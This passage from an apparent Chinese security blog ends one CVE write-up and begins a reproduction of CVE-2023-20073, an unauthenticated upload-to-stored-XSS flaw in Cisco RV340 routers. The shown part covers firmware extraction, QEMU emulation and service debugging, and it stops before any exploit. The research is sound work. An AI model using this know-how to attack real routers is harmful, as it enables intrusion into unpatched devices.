<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>对于 <strong>CVE-2023-34644</strong> 的复现结束了，这个漏洞的复现从开始到结束历经了一个多月（与此同时还有 <strong>CVE-2023-38902</strong> 的研究）。期间碰到了很多奇怪的报错以及思考时产生的疑问，比起 <strong>CVE-2023-20073</strong> 的复现，这次自己进行了更多的思考。再次要特别感谢 <strong>winmt</strong> 师傅，关于 <strong>CVE-2023-34644</strong> 的大部分关键点其实 <strong>winmt</strong> 已经写的很详细了。但是在复现的过程中，对于我这个初学者来说，依然有很多的问题感到一知半解，有不少地方经过尝试后依然没有思路，都想得过且过，认为此处理解的不透彻也并不影响整体的分析。可在细节上得过且过，真的在独立的漏洞挖掘中有所高质量的产出么？扪心自问，我不认为会有高质量的产出。比如在上文提到的信号量触发 <code>uf_cmd_call</code> 函数，不追踪到底的话，我只知道有个地方肯定操作了信号量导致了 <code>uf_cmd_call</code> 执行，但具体是哪里操作的信号量呢？<code>IDA</code> 显示不完整的情况下，探究的过程并不容易。如果不知道具体哪里操作的信号量，我就不能说完全弄清了整个的漏洞调用链，那复现一个漏洞连完整的触发调用链都没搞清，那复现的意义到底是什么呢？在复现的过程中都是一知半解，那在真实环境下进行独立的漏洞挖掘，找漏洞又何从谈起呢，甚至于找到了漏洞，但是连怎么走到漏洞点都分析不明白。感谢 <strong>winmt</strong> 多次 <strong>“push”</strong> ，让我没有得过且过。对于学习而言，可能比起当前暂时领先于常人的能力和知识而言，对 产生的问题始终保持好奇 和 “再试一次”的精神 更为重要和难得。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_4">https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_4</a></p>
<p><a href="https://blog.csdn.net/zujipi8736/article/details/86606093">https://blog.csdn.net/zujipi8736/article/details/86606093</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
        <category>复现CVE</category>
      </categories>
      <tags>
        <tag>MIPS架构</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始复现CVE-2023-20073</title>
    <url>/posts/848296ab.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这算第二次复现 <code>IOT</code> 漏洞，第一次是很老的 <code>DIR-815</code> ，第二次直接复现的是 <strong>winmt</strong> 师傅今年挖到的一个思科漏洞 <strong>CVE-2023-20073</strong> 。年份上跨越不算小，就导致了复现过程中屡屡遇到问题而没什么解决的办法，而网上除了 <strong>winmt</strong> 师傅本人做了漏洞的分析之外，也没有找到其他资料。这里发自内心的感谢 <strong>winmt</strong> 师傅给予我提供的指导和帮助，否则可能要走更多的弯路甚至会对很多地方一知半解的就完成了所谓的 “复现” ，写这篇文章的一个重要目的就是想帮助之后复现这个漏洞的师傅提供一些参考，毕竟不是每个人都能遇见一个万能的 <strong>winmt</strong> QAQ。本文对于 <strong>CVE-2023-20073</strong> 复现过程做了详尽的记录，其中包括了遇见过的各种坑和解决问题的方法及思路。再次对 <strong>winmt</strong> 师傅表示感谢！</p>
<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p><code>Cisco RV340</code>，<code>RV340W</code>，<code>RV345</code>和 <code>RV345P</code> 四款型号的路由器中最新固件均存在一个未授权任意文件上传漏洞 （且目前尚未修复），攻击者可以在未授权的情况下将文件上传到 <code>/tmp/upload</code> 目录中，然后利用 <code>upload.cgi</code> 程序中存在的漏洞，最终造成存储型 <code>XSS</code> 攻击。</p>
<span id="more"></span>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308012305968.png" alt="image-20230801230513816"></p>
<p>近一年的 <code>IP </code>数量在 <code>2.8w</code> 左右</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308012054406.png" alt="image-20230801205455264"></p>
<h2 id="仿真"><a href="#仿真" class="headerlink" title="仿真"></a>仿真</h2><p>环境信息</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">类型</th>
<th align="left">版本</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">操作系统</td>
<td align="left">ubuntu18.04</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">QEMU</td>
<td align="left">7.2.0</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">Binwalk</td>
<td align="left">V2.3.3</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">gdb</td>
<td align="left">8.1.1</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">gbserver</td>
<td align="left">gdbserver-7.7.1-armhf-eabi5-v1-sysv</td>
</tr>
</tbody></table>
<h3 id="下载固件"><a href="#下载固件" class="headerlink" title="下载固件"></a>下载固件</h3><p>首先在 <a href="https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.29">思科官网</a> 中下载最新的 <code>RV340</code> 固件</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311024632.png" alt="image-20230731102424490"></p>
<h3 id="固件解压-提取文件系统"><a href="#固件解压-提取文件系统" class="headerlink" title="固件解压-提取文件系统"></a>固件解压-提取文件系统</h3><p>把固件拖到虚拟机里用 <code>binwalk解压</code> ，执行 <code>binwalk -Me RV34X-v1.0.03.29-2022-10-17-13-45-34-PM.img</code></p>
<p>执行后发现没有找到解压出来的文件系统，然后看一下 <code>binwalk</code> 给的 <code>warning</code> （如下），说是执行失败 <code>ubireader_extract_files</code> 程序</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311030068.png" alt="image-20230731103026482"></p>
<p>这是因为这里的文件系统是 <code>ubi</code> 格式的，我的 <code>binwalk</code> 当初是用 <code>apt install binwalk</code> 安装的，就导致少装一些东西（尽量通过源码安装 <code>binwalk</code> ），最终就没提取出来这个 <code>ubi</code> 格式的文件系统。可以看到下面这个路径的位置只有一个 <code>0.ubi</code> 的文件，确实是没提取出来文件系统的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311032135.png" alt="image-20230731103251993"></p>
<p>解决方法：安装 <code>ubi_reader</code> （ <code>ubi_reader</code> 工具中就包含了上面缺少的 <code>ubireader_extract_files</code> 脚本 ） ，命令如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install liblzo2-dev </span><br><span class="line">sudo pip3 install python-lzo</span><br><span class="line">sudo pip3 install ubi_reader</span><br></pre></td></tr></table></figure>



<p>安装成功后，重新执行 <code>binwalk</code> 提取文件系统，可以看到这次就成功将文件系统提取出来了（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311048414.png" alt="image-20230731104809313"></p>
<p>但是还没完，<code>binwalk</code> 还有 <code>warning</code> （如下图），说是原本文件中存在的软链接指向了提取目录之外，就比如当前的 <code>var</code> 目录，它指向的是我本机的 <code>/tmp</code> 目录，为了安全考虑 <code>binwalk</code> 将这种软链接都置成了 <code>/dev/null</code> 。这里放任不管的话，<strong>之后的仿真会失败，比如路由器的某个服务需要去访问 <code>var</code> 目录下的文件，但它如果是被置成 <code>/dev/null</code> 的话，目录自然是缺失的</strong>。其实这个 <code>var -&gt; /tmp</code> 的本意是指向提取出来文件系统的 <code>/tmp</code> ，并非是我本机的 <code>/tmp</code> ，因此只要我能<strong>保留这个软链接，到时候用 <code>chroot</code> 创建一个隔离的文件系统就一切正常了</strong></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311051853.png" alt="image-20230731105118287"></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311111012.png" alt="image-20230731111106744" style="zoom: 67%;" />

<p>解决方法：通过上面报错的字符串找到是出现在 <code>binwalk/build/lib/binwalk/modules/extractor.py </code> 文件（如下图），将 <code>if not ...</code> 修改为 <code>if 0 and not ...</code> <img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311100921.png" alt="image-20230731110000305"></p>
<p>然后回到 <code>binwalk</code> 主目录执行 <code>sudo python3 setup.py install</code> 重新安装一下，如此就不会再执行将软链接置成 <code>/dev/null</code> 的操作了</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311105267.png" alt="image-20230731110544743"></p>
<p>对于解压 <code>ubi</code> 格式的文件系统补充两个方法，因为我们只是要文件系统，所以 <code>binwalk</code> 解压出来 <code>0.ubi</code> 文件后（用其他解压软件也能解出来 <code>0.ubi</code>，比如 <code>7zip</code>），可以直接用 <code>ubireader_extract_files  0.ubi</code> 命令来解压 <code>0.ubi</code>，这样不会出现那个软链接的问题，但得安装 <code>ubi_reader</code>。还可以使用 <a href="https://github.com/nlitsme/ubidump/blob/master/ubidump.py">ubidump </a> 对 <code>ubi</code> 文件系统进行提取，直接复制源码，然后执行 <code>python3 ubidump.py -s .  0.ubi</code> 进行提取，这两种方法都不会破坏其中的软链接。</p>
<h3 id="实现宿主机与-qemu-的通信"><a href="#实现宿主机与-qemu-的通信" class="headerlink" title="实现宿主机与 qemu 的通信"></a>实现宿主机与 <code>qemu</code> 的通信</h3><p>因为之后需要用 <code>scp</code> 传文件以及启动服务等操作肯定是需要配置 <code>qemu</code> 模拟环境网络的，大概原理就是设置一个网桥，然后开一个接口，把这个接口给 <code>qemu</code> ，然后流量的发送都通过这个网桥，画成图的话就是下面这个样子</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311139846.png" alt="image-20230731113938764"></p>
<p>具体方法：创建一个 <code>net.sh</code> 脚本，我这里的网卡是 <code>ens33</code> ，如果是 <code>eth0</code> 的话，就把出现的 <code>ens33</code> 换成 <code>eth0</code> 即可，<code>chmod +x net.sh</code> 给文件可执行权限，然后 <code>./net.sh</code> 运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">#sudo ifconfig eth0 down                 # 首先关闭宿主机网卡接口</span><br><span class="line">sudo brctl addbr br0                     # 添加一座名为 br0 的网桥</span><br><span class="line">sudo brctl addif br0 ens33                # 在 br0 中添加一个接口</span><br><span class="line">sudo brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议</span><br><span class="line">sudo brctl setfd br0 1                   # 设置 br0 的转发延迟</span><br><span class="line">sudo brctl sethello br0 1                # 设置 br0 的 hello 时间</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up    # 启用网卡接口</span><br><span class="line">sudo dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址</span><br><span class="line">sudo brctl show br0                      # 查看虚拟网桥列表</span><br><span class="line">sudo brctl showstp br0                   # 查看 br0 的各接口信息</span><br><span class="line">sudo tunctl -t tap0 -u root              # 创建一个 tap0 接口，只允许 root 用户访问</span><br><span class="line">sudo brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure>



<h3 id="启动qemu模拟环境"><a href="#启动qemu模拟环境" class="headerlink" title="启动qemu模拟环境"></a>启动qemu模拟环境</h3><p>首先用 <code>file</code> 命令查看一下 <code>busybox</code> 的文件信息（如下），这里是 <code>ARM</code> 架构 小端序，因此我们要下载对应的内核映像还有磁盘映像等文件</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311117095.png" alt="image-20230731111736780"></p>
<p>访问 <a href="https://people.debian.org/~aurel32/qemu/armhf/">网站</a>     下载这三个文件</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311126613.png" alt="image-20230731112648456"></p>
<p>使用 <code>wget</code> 来下载文件，命令如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress</span><br></pre></td></tr></table></figure>



<p>启动脚本如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">  -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">  -append &quot;root=/dev/mmcblk0p2&quot; -net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">  -nographic -smp 4</span><br></pre></td></tr></table></figure>

<p>如果执行启动脚本的话，应该会报如下错误，这里说的是 <code>SD card size</code> 应该是 <code>2</code> 的幂，应该改成 <code>32GB</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311140026.png" alt="image-20230731114041915"></p>
<p>解决方法是执行 <code>qemu-img resize debian_wheezy_armhf_standard.qcow2 32G</code></p>
<p>再次执行启动脚本，大概要等待两分钟左右就会让输入账号和密码（如下），账号密码都是 <code>root</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311144359.png" alt="image-20230731114437217"></p>
<p>进去后看到了 <code>IP</code> ，并且能正常与宿主机通信（如下图）就说明到这里都是操作正确的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311154670.png" alt="image-20230731115434275"></p>
<h3 id="启动服务-amp-amp-解决报错"><a href="#启动服务-amp-amp-解决报错" class="headerlink" title="启动服务&amp;&amp;解决报错"></a>启动服务&amp;&amp;解决报错</h3><p>先把文件系统给压缩打包，然后用 <code>scp</code> 传到 <code>qemu</code> 中，再将文件系统解压（这里发送的时候要发压缩包，不然后续有可能会缺少文件，我最初因为传的是文件夹，导致出现了错误，就在这里浪费了很多时间）</p>
<p>压缩命令 <code>tar -czvf rootfs.tar.gz rootfs</code></p>
<p>传输文件命令 <code>sudo scp -r rootfs.tar.gz root@192.168.45.66:/root/rootfs.tar.gz</code> （<code>IP</code> 、用户名和路径都换成自己的）</p>
<p>解压命令 <code>tar -xzvf rootfs.tar.gz</code></p>
<p>接下来进行仿真时要先用 <code>chroot</code> 命令创建隔离的文件系统环境。但这会导致无法在隔离的文件系统中访问原本的 <code>/proc</code>和  <code>/dev</code> 目录，因为它们是特殊的虚拟文件夹（用于提供系统信息和设备的访问）为了让 <code>qemu </code> 环境正常运行，需将原本 <code>qemu</code> 的 <code>/proc</code> 和 <code>/dev</code> 目录挂载到新创建的隔离环境中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod -R 777 rootfs</span><br><span class="line">cd rootfs/</span><br><span class="line">mount --bind /proc proc</span><br><span class="line">mount --bind /dev dev</span><br><span class="line">chroot . /bin/sh</span><br></pre></td></tr></table></figure>



<p>还记得上文提到的软链接的问题么，此时位于这个文件系统中，软链接就已经指向了正确的位置（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311428856.png" alt="image-20230731142803598"></p>
<p>在 <code>/etc/init.d</code> 目录下存放了各种服务的启动和停止脚本，下面这里发现有 <code>nginx</code> 服务的脚本</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311452855.png" alt="image-20230731145225537" style="zoom:67%;" />



<p>然后尝试开启 <code>nginx</code> 服务，执行命令 <code>/etc/init.d/nginx start</code> ，访问一下 <code>qemu</code> 环境的 <code>IP</code> ，看服务是否启动（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311458802.png" alt="image-20230731145834699"></p>
<p>没跑起来，然后看一下报错信息（如下）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ # /etc/init.d/nginx start</span><br><span class="line">uci: Entry not found</span><br><span class="line">chown: /var/firmware: No such file or directory</span><br><span class="line">chown: /var/3g-4g-driver: No such file or directory</span><br><span class="line">chown: /var/in_certs: No such file or directory</span><br><span class="line">chown: /var/signature: No such file or directory</span><br><span class="line">chown: /var/language-pack: No such file or directory</span><br><span class="line">chown: /var/configuration: No such file or directory</span><br><span class="line">FAILED: confd_load_schemas(addr, addrlen), Error: system call failed (24): Connection refused, in function run, line 2413</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">touch: /tmp/stats/certstats.tmp: No such file or directory</span><br><span class="line">perl: warning: Setting locale failed.</span><br><span class="line">perl: warning: Please check that your locale settings:</span><br><span class="line">	LANGUAGE = (unset),</span><br><span class="line">	LC_ALL = (unset),</span><br><span class="line">	LANG = &quot;en_US.UTF-8&quot;</span><br><span class="line">    are supported and installed on your system.</span><br><span class="line">perl: warning: Falling back to the standard locale (&quot;C&quot;).</span><br><span class="line">cp: can&#x27;t stat &#x27;/tmp/stats/certstats.tmp&#x27;: No such file or directory</span><br><span class="line">FAILED: confd_load_schemas(addr, addrlen), Error: system call failed (24): Connection refused, in function run, line 2413</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">touch: /tmp/stats/certstats.tmp: No such file or directory</span><br><span class="line">perl: warning: Setting locale failed.</span><br><span class="line">perl: warning: Please check that your locale settings:</span><br><span class="line">	LANGUAGE = (unset),</span><br><span class="line">	LC_ALL = (unset),</span><br><span class="line">	LANG = &quot;en_US.UTF-8&quot;</span><br><span class="line">    are supported and installed on your system.</span><br><span class="line">perl: warning: Falling back to the standard locale (&quot;C&quot;).</span><br><span class="line">cp: can&#x27;t stat &#x27;/tmp/stats/certstats.tmp&#x27;: No such file or directory</span><br><span class="line">FAILED: confd_load_schemas(addr, addrlen), Error: system call failed (24): Connection refused, in function run, line 2413</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">touch: /tmp/stats/certstats.tmp: No such file or directory</span><br><span class="line">perl: warning: Setting locale failed.</span><br><span class="line">perl: warning: Please check that your locale settings:</span><br><span class="line">	LANGUAGE = (unset),</span><br><span class="line">	LC_ALL = (unset),</span><br><span class="line">	LANG = &quot;en_US.UTF-8&quot;</span><br><span class="line">    are supported and installed on your system.</span><br><span class="line">perl: warning: Falling back to the standard locale (&quot;C&quot;).</span><br><span class="line">cp: can&#x27;t stat &#x27;/tmp/stats/certstats.tmp&#x27;: No such file or directory</span><br><span class="line">Collected errors:</span><br><span class="line"> * opkg_conf_load: Could not create lock file /var/lock/opkg.lock: No such file or directory.</span><br><span class="line">nginx: [emerg] open() &quot;/var/lock/nginx.lock.accept&quot; failed (2: No such file or directory)</span><br><span class="line">uci: Entry not found</span><br><span class="line">/ # [uWSGI] getting INI configuration from /etc/uwsgi/blockpage.ini</span><br><span class="line">[uWSGI] getting INI configuration from /etc/uwsgi/jsonrpc.ini</span><br><span class="line">[uWSGI] getting INI configuration from /etc/uwsgi/upload.ini</span><br><span class="line">*** Starting uWSGI 2.0.15 (32bit) on [Mon Jul 31 06:57:28 2023] ***</span><br><span class="line">compiled with version: 4.8.3 on 17 October 2022 13:32:49</span><br><span class="line">os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1</span><br><span class="line">nodename: debian-armhf</span><br><span class="line">machine: armv7l</span><br><span class="line">clock source: unix</span><br><span class="line">pcre jit disabled</span><br><span class="line">detected number of CPU cores: 4</span><br><span class="line">current working directory: /</span><br><span class="line">detected binary path: /usr/sbin/uwsgi</span><br><span class="line">*** Starting uWSGI 2.0.15 (32bit) on [Mon Jul 31 06:57:28 2023] ***</span><br><span class="line">compiled with version: 4.8.3 on 17 October 2022 13:32:49</span><br><span class="line">os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1</span><br><span class="line">nodename: debian-armhf</span><br><span class="line">machine: armv7l</span><br><span class="line">clock source: unix</span><br><span class="line">pcre jit disabled</span><br><span class="line">detected number of CPU cores: 4</span><br><span class="line">current working directory: /</span><br><span class="line">detected binary path: /usr/sbin/uwsgi</span><br><span class="line">*** Starting uWSGI 2.0.15 (32bit) on [Mon Jul 31 06:57:28 2023] ***</span><br><span class="line">setgid() to 33</span><br><span class="line">compiled with version: 4.8.3 on 17 October 2022 13:32:49</span><br><span class="line">os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1</span><br><span class="line">nodename: debian-armhf</span><br><span class="line">machine: armv7l</span><br><span class="line">clock source: unix</span><br><span class="line">pcre jit disabled</span><br><span class="line">detected number of CPU cores: 4</span><br><span class="line">current working directory: /</span><br><span class="line">detected binary path: /usr/sbin/uwsgi</span><br><span class="line">setgid() to 33</span><br><span class="line">setgid() to 33</span><br><span class="line">setuid() to 33</span><br><span class="line">setuid() to 33</span><br><span class="line">setuid() to 33</span><br><span class="line">your processes number limit is 961</span><br><span class="line">your memory page size is 4096 bytes</span><br><span class="line">detected max file descriptor number: 1024</span><br><span class="line">your processes number limit is 961</span><br><span class="line">your memory page size is 4096 bytes</span><br><span class="line">lock engine: pthread robust mutexes</span><br><span class="line">detected max file descriptor number: 1024</span><br><span class="line">lock engine: pthread robust mutexes</span><br><span class="line">your processes number limit is 961</span><br><span class="line">your memory page size is 4096 bytes</span><br><span class="line">detected max file descriptor number: 1024</span><br><span class="line">lock engine: pthread robust mutexes</span><br><span class="line">thunder lock: disabled (you can enable it with --thunder-lock)</span><br><span class="line">thunder lock: disabled (you can enable it with --thunder-lock)</span><br><span class="line">uwsgi socket 0 bound to TCP address 127.0.0.1:9001 fd 3</span><br><span class="line">uwsgi socket 0 bound to TCP address 127.0.0.1:9000 fd 3</span><br><span class="line">your server socket listen backlog is limited to 100 connections</span><br><span class="line">your server socket listen backlog is limited to 100 connections</span><br><span class="line">your mercy for graceful operations on workers is 60 seconds</span><br><span class="line">thunder lock: disabled (you can enable it with --thunder-lock)</span><br><span class="line">uwsgi socket 0 bound to TCP address 127.0.0.1:9003 fd 3</span><br><span class="line">your mercy for graceful operations on workers is 60 seconds</span><br><span class="line">your server socket listen backlog is limited to 100 connections</span><br><span class="line">mapped 128512 bytes (125 KB) for 1 cores</span><br><span class="line">mapped 321280 bytes (313 KB) for 4 cores</span><br><span class="line">*** Operational MODE: preforking ***</span><br><span class="line">initialized CGI mountpoint: /jsonrpc = /www/cgi-bin/jsonrpc.cgi</span><br><span class="line">*** Operational MODE: single process ***</span><br><span class="line">initialized CGI mountpoint: /blocked.php = /www/cgi-bin/blockpage.cgi</span><br><span class="line">*** no app loaded. going in full dynamic mode ***</span><br><span class="line">your mercy for graceful operations on workers is 60 seconds</span><br><span class="line">*** no app loaded. going in full dynamic mode ***</span><br><span class="line">mapped 128512 bytes (125 KB) for 1 cores</span><br><span class="line">*** uWSGI is running in multiple interpreter mode ***</span><br><span class="line">spawned uWSGI master process (pid: 2903)</span><br><span class="line">*** uWSGI is running in multiple interpreter mode ***</span><br><span class="line">spawned uWSGI worker 1 (pid: 2906, cores: 1)</span><br><span class="line">spawned uWSGI master process (pid: 2904)</span><br><span class="line">*** Operational MODE: single process ***</span><br><span class="line">initialized CGI path: /www/cgi-bin/upload.cgi</span><br><span class="line">*** no app loaded. going in full dynamic mode ***</span><br><span class="line">*** uWSGI is running in multiple interpreter mode ***</span><br><span class="line">spawned uWSGI master process (pid: 2905)</span><br><span class="line">spawned uWSGI worker 1 (pid: 2909, cores: 1)</span><br><span class="line">spawned uWSGI worker 2 (pid: 2908, cores: 1)</span><br><span class="line">spawned uWSGI worker 1 (pid: 2907, cores: 1)</span><br><span class="line">spawned uWSGI worker 3 (pid: 2910, cores: 1)</span><br><span class="line">spawned uWSGI worker 4 (pid: 2911, cores: 1)</span><br></pre></td></tr></table></figure>

<p>就这里有一个报错 <code>FAILED: confd_load_schemas(addr, addrlen), Error: system call failed (24): Connection refused, in function run, line 2413</code> 也不太清楚这是什么，但是这里有一个 <code>confd</code> ，而在 <code>/etc/init.d</code> 目录下，有一个 <code>confd</code> 服务（查了一下资料，说是轻量级的配置管理工具），那就给它启起来，执行 <code>/etc/init.d/confd start</code></p>
<p>报错信息如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ # /etc/init.d/confd start</span><br><span class="line">uci: Entry not found</span><br><span class="line">cp: can&#x27;t stat &#x27;/etc/ssl/private/Default.pem&#x27;: No such file or directory</span><br><span class="line">Failed reading &#x27;/tmp/dropbear_host_key&#x27;</span><br><span class="line">TRACE Connected (maapi) to ConfD</span><br><span class="line">attaching to init session...</span><br><span class="line">TRACE MAAPI_ATTACH  --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_DELETE /avc-meta-data --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_LOAD_CONFIG_FILE  --&gt; CONFD_OK</span><br><span class="line">TRACE Connected (maapi) to ConfD</span><br><span class="line">attaching to init session...</span><br><span class="line">TRACE MAAPI_ATTACH  --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_DELETE /device-os-types --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_LOAD_CONFIG_FILE  --&gt; CONFD_OK</span><br><span class="line">TRACE Connected (maapi) to ConfD</span><br><span class="line">attaching to init session...</span><br><span class="line">TRACE MAAPI_ATTACH  --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_DELETE /webfilter-meta-data --&gt; CONFD_OK</span><br><span class="line">TRACE MAAPI_LOAD_CONFIG_FILE  --&gt; CONFD_OK</span><br><span class="line">0</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">CDB boot error: Init transaction failed to validate: /confd_dyncfg:confdConfig: Need read access to one of the files ./ssh/ssh_host_dsa_key and ./ssh/ssh_host_rsa_key defined for /confdConfig/aaa/sshServerKeyDir</span><br><span class="line">0</span><br><span class="line">connection refused (start_phase2)</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">FAILED: confd_load_schemas(addr, addrlen), Error: system call failed (24): Connection refused, in function run, line 2413</span><br><span class="line">FAILED: confd_load_schemas(addr, addrlen), Error: system call failed (24): Connection refused, in function run, line 2413</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">FAILED: maapi_connect(ms, addr, addrlen), Error: system call failed (24): Connection refused, in function run, line 2432</span><br><span class="line">FAILED: maapi_connect(ms, addr, addrlen), Error: system call failed (24): Connection refused, in function run, line 2432</span><br><span class="line">FAILED: maapi_connect(ms, addr, addrlen), Error: system call failed (24): Connection refused, in function run, line 2432</span><br><span class="line">FAILED: maapi_connect(ms, addr, addrlen), Error: system call failed (24): Connection refused, in function run, line 2432</span><br></pre></td></tr></table></figure>

<p>然后这里出现的报错是 <code>cp: can&#39;t stat &#39;/etc/ssl/private/Default.pem&#39;: No such file or directory </code> 这意味着是缺少 <code>ssl</code> 证书，搜索一下字符串 <code>/etc/ssl/private</code> （我是放到 <code>vscode</code> 里搜的）发现大概有十几个文件吧，里面有一个文件叫做  <code>generate_default_cert</code>  ，这名字一听就很正经，叫做生成默认证书😄   </p>
<p>因此执行 <code>generate_default_cert</code>，发现还有报错，信息如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ # generate_default_cert</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">uci: Entry not found</span><br><span class="line">cp: can&#x27;t stat &#x27;/tmp/etc/config/certificate&#x27;: No such file or directory</span><br><span class="line">touch: /tmp/stats/certstats.tmp: No such file or directory</span><br><span class="line">/usr/bin/certscript: line 1: can&#x27;t create /tmp/stats/certstats.tmp: nonexistent directory</span><br><span class="line">perl: warning: Setting locale failed.</span><br><span class="line">perl: warning: Please check that your locale settings:</span><br><span class="line">	LANGUAGE = (unset),</span><br><span class="line">	LC_ALL = (unset),</span><br><span class="line">	LANG = &quot;en_US.UTF-8&quot;</span><br><span class="line">    are supported and installed on your system.</span><br><span class="line">perl: warning: Falling back to the standard locale (&quot;C&quot;).</span><br><span class="line">cp: can&#x27;t stat &#x27;/tmp/stats/certstats.tmp&#x27;: No such file or directory</span><br><span class="line">Default</span><br></pre></td></tr></table></figure>

<p>这里一直有一个错误是 <code>uci: Entry not found</code> ，百度一下，结果如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311636539.png" alt="image-20230731163628456" style="zoom:67%;" />

<p>意思是 <code>uci</code> 读取的这个配置路径不存在（我是这里理解的），然后在 <code>/etc/init.d/boot</code> 文件中有两行代码，就是来创建的路径。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307311639899.png" alt="image-20230731163920404"></p>
